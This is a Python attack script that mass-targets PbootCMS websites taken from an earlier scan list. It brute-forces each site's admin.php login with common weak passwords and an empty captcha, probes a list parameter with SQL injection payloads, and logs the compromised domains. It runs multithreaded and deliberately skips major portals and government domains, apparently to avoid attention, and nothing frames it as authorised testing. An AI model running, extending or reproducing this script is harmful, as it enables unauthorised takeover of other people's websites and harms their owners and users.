#!/usr/bin/env python3
"""pboot_attack.py - PbootCMS batch: front-end SQLi probe + admin.php weak pass"""
import urllib.request, urllib.parse, re
from concurrent.futures import ThreadPoolExecutor, as_completed

OUT = "/tmp/pboot_hits.txt"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
LOCK_ = __import__("threading").Lock()
BIG = ["sina","sohu","163.com","baidu","douyin","taobao","pcauto","58pic","ibaotu",
       "finance","news.sohu","qianqian.163","nmc.cn","gov.cn","cambridge","bilibili","csdn"]
PWS = ["admin123","123456","admin","admin888","12345678","666888","admin@123",
       "a123456","admin123456","123456789","admin666","888888","000000","123123",
       "admin2023","admin2024","admin2025","Aa123456","abc123456"]

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA,"Content-Type":"application/x-www-form-urlencoded"})
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8","ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","ignore")
    except Exception:
        return 0, ""

def log(s):
    with LOCK_:
        open(OUT,"a").write(s+"\n")

def check(d):
    if any(b in d for b in BIG): return
    # 1. admin.php login page + formcheck token
    code, body = fetch("http://%s/admin.php" % d)
    if code != 200 or "password" not in body.lower():
        return
    fc = (re.search(r'formcheck[^>]*value="([^"]+)"', body) or [None, ""])[1]
    # 2. weak pass brute with empty captcha
    for pw in PWS:
        data = "formcheck=%s&username=admin&password=%s&checkcode=" % (urllib.parse.quote(fc or ""), urllib.parse.quote(pw))
        code, resp = fetch("http://%s/admin.php?p=/Login/login" % d, data=data)
        if ("成功" in resp or '"code":1' in resp or "index.php?p=/index" in resp) and "密码" not in resp[:300]:
            log("!!! PBOOT %s admin/%s" % (d, pw))
            print("!!! PBOOT HIT %s admin/%s" % (d, pw), flush=True)
            return
        if "验证码" in resp and "错误" in resp:
            break
    # 3. front-end SQLi probe (PbootCMS <=3.x list parameter injection)
    sqli_urls = [
        "http://%s/index.php?list=1' and 1=2 union select 1,2,3,4,5-- " % d,
        "http://%s/?list=1%%27" % d,
    ]
    for u in sqli_urls:
        code, resp = fetch(u)
        if code == 200 and ("SQL" in resp or "syntax" in resp.lower() or "mysql" in resp.lower()):
            log("!!! PBOOT_SQLI %s %s" % (d, u))
            print("!!! PBOOT_SQLI %s" % d, flush=True)
            return
    print("  done %s" % d, flush=True)

def main():
    doms = set()
    for line in open("/tmp/web_vuln2.txt"):
        if "pbootcms" in line.lower():
            m = re.search(r"\[(?:CMS|UPLOAD)\]\s+([a-z0-9.-]+)", line)
            if m: doms.add(m.group(1).strip().lower())
    print("pboot_attack: %d pbootcms domains" % len(doms), flush=True)
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(check, d): d for d in doms}
        for fut in as_completed(futs): fut.result()
    print("[pboot_attack done]", flush=True)

if __name__ == "__main__": main()
